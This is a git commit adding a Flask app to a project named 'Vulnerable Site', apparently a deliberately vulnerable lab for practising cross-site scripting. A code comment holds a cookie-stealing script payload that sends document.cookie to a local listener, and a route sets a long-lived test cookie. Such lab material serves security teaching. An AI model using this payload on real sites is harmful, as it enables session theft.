e1aa74c5250eec99cac9ba737d67dee1f5d7b9d3
Junhua <wenjh1998@gmail.com>
2020-12-18 16:50:32 +0800

    Repackage vulnerable website

---
+++ Vulnerable Site/app.py
@@ -0,0 +1,29 @@
+from flask import Flask, render_template, request, make_response
+import db
+
+app = Flask(__name__)
+
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        db.add_comment(request.form['comment'])
+
+    search_query = request.args.get('q')
+
+    comments = db.get_comments(search_query)
+
+    return render_template('index.html',
+                           comments=comments,
+                           search_query=search_query)
+
+# <script>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>
+
+@app.route('/cookie/')
+def cookie():
+    if not request.cookies.get('foo'):
+        res = make_response("Setting a cookie")
+        res.set_cookie('foo', 'bar', max_age=60*60*24*365*2)
+    else:
+        res = make_response("Value of cookie foo is {}".format(request.cookies.get('foo')))
+    return res
